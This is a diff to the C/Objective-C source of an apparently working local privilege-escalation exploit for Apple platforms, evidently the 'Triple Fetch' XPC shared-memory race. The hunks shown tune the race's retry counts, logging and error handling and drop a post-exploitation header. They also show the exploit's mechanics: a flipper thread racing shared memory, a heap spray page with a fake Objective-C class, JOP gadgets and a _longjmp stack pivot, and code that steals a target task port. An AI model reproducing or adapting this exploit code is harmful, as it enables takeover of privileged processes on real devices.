@@ -16,7 +16,6 @@
 #include "minibplist16.h"
 #include "xpc_handshake.h"
 
-#include "post_exploit.h"
 
 #import <dlfcn.h>
 
@@ -105,7 +104,7 @@ build_shm_invocation(
   // OOL xpc data objects have to be GREATER than 0x4000 (ie at least two 16k pages)
   // round up that size to the next 0x4000 boundary:
   mach_vm_size_t shm_size = (invocation_size + 0x7fff) & (~0x3fffULL);
-  printf("invocation_size: %zx, shm_size: %llx\n", invocation_size, shm_size);
+  printf("[INFO]: invocation_size: %zx, shm_size: %llx\n", invocation_size, shm_size);
 
   // allocate full pages for the buffer
 	kern_return_t err;
@@ -140,7 +139,7 @@ build_shm_invocation(
   if (err != KERN_SUCCESS) {
     printf("vm_map failed: %x\n", err);
   }
-  printf("mapped shm port at: %llx\n", mapped_buf);
+  printf("[INFO]: mapped shm port at: %llx\n", mapped_buf);
 
 
   return (void*)mapped_buf;
@@ -286,7 +285,7 @@ static void*
 flipper_thread(
   void* arg)
 {
-  printf("flipper arg: %p\n", arg);
+  printf("[INFO]: flipper arg: %p\n", arg);
 
   int err = pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, NULL);
   if (err != 0) {
@@ -378,11 +377,7 @@ int got_no_more_senders(mach_port_t q) {
                        (mach_msg_trailer_info_t)&msg_trailer,
                        &msg_trailer_size);
   
-  if (err == KERN_SUCCESS && msg_id == 0x46) {
-//    printf("got NMS\n");
-    return 1;
-  }
-  return 0;
+  return (err == KERN_SUCCESS && msg_id == 0x46) ? 1: 0;
 }
 
 struct task_port_msg {
@@ -594,7 +589,7 @@ uint64_t build_spray_page() {
   uint64_t initial_pc = find_gadget_candidate(x0_jops, x0_jop_length);
   
   uint64_t target_selector = (uint64_t)sel_registerName("_xref_dispose");
-  printf("target selector address: %llx\n", target_selector);
+  printf("[INFO]: target selector address: %llx\n", target_selector);
   
   fake_class->pad_0 = 0;
   fake_class->pad_1 = 0;
@@ -633,7 +628,7 @@ uint64_t build_spray_page() {
   struct jmpbuf* jmpbuf = (struct jmpbuf*)(jmpbuf_and_jop_addr); // 0x120204080
 
   uint64_t stack_pivot = (uint64_t)_longjmp;
-  printf("stack pivot: %llx\n", stack_pivot);
+//  printf("stack pivot: %llx\n", stack_pivot);
   // the jmpbuf will first be used for the JOP gadget which reads its next pc value from +0x10
   // which overlaps with x21, so set that to be the actual stack pivot gadget:
   jmpbuf->x21 = stack_pivot;
@@ -760,6 +755,11 @@ add_heap_spray_to_dictionary(
 {
   void* heapspray_contents =  (void*) build_spray_page();
   
+    if(heapspray_contents == NULL) {
+        // try rebuilding the spray page.. if fails, we fail too
+        heapspray_contents = (void *) build_spray_page();
+    }
+    
   size_t heapspray_page_size = 0x4000;
   size_t n_heapspray_pages = 0x200; // 0x100 works too
   size_t full_heapspray_size = n_heapspray_pages * heapspray_page_size;
@@ -767,8 +767,9 @@ add_heap_spray_to_dictionary(
   kern_return_t err;
   mach_vm_address_t full_heapspray = 0;
   err = mach_vm_allocate(mach_task_self(), &full_heapspray, full_heapspray_size, 1);
-  
+    
   for (size_t i = 0; i < n_heapspray_pages; i++) {
+      // TODO
     memcpy((void*)(full_heapspray + (i*heapspray_page_size)), heapspray_contents, heapspray_page_size);
   }
   
@@ -857,7 +858,7 @@ static mach_port_t sploit() {
   int count = 0;
     
   // fill in the destination port each time we send it.
-  while (1) {
+  while (count <= 90) {
     // connect to the service:
     mach_port_t client_port = MACH_PORT_NULL;
     mach_port_t reply_port = MACH_PORT_NULL;
@@ -890,7 +891,7 @@ static mach_port_t sploit() {
     // c) win!
 
     // give ourselves a send right on the reply port:
-    //mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
+//    mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
     
     // request no senders notification on the reply port
     mach_port_t notify_q = MACH_PORT_NULL;
@@ -905,10 +906,9 @@ static mach_port_t sploit() {
                                          MACH_MSG_TYPE_MAKE_SEND_ONCE,
                                          &old_so);
     if (err != KERN_SUCCESS) {
-      printf("failed to register for no senders notification (%s)\n", mach_error_string(err));
-      exit(EXIT_FAILURE);
+        printf("failed to register for no senders notification (%s)\n", mach_error_string(err));
+        return MACH_PORT_NULL;
     }
-      
       
       
       // actually send the message:
@@ -927,22 +927,28 @@ static mach_port_t sploit() {
       // add a check to see if we succeeded!
       mach_port_t target_task_port = check_if_we_got_task_port(target_ps);
       if (target_task_port != MACH_PORT_NULL) {
-        printf("[INFO]: Triple Fetch succeeded\n");
+          
+          printf("[INFO]: triple fetch succeeded\n");
         
-        // stop the flipper thread:
-        //pthread_cancel(th);
-        stop_flipper_thread = 1;
-        pthread_join(th, NULL);
+          // stop the flipper thread:
+          pthread_cancel(th);
+          stop_flipper_thread = 1;
+          pthread_join(th, NULL);
         
-        // clean up the resources
-        mach_port_destroy(mach_task_self(), notify_q);
-        mach_port_destroy(mach_task_self(), client_port);
-        mach_port_destroy(mach_task_self(), reply_port);
+          // clean up the resources
+          mach_port_destroy(mach_task_self(), notify_q);
+          mach_port_destroy(mach_task_self(), client_port);
+          mach_port_destroy(mach_task_self(), reply_port);
         
-        return target_task_port;
+          return target_task_port;
       } else {
           
-          if(try_count > 30000) {
+          if(count == 0) {
+
+              if(try_count > 15000)
+                  break;
+
+          } else if(try_count > 21000) {
               
               printf("[ERROR]: Too many attempts. Failed.\n");
               
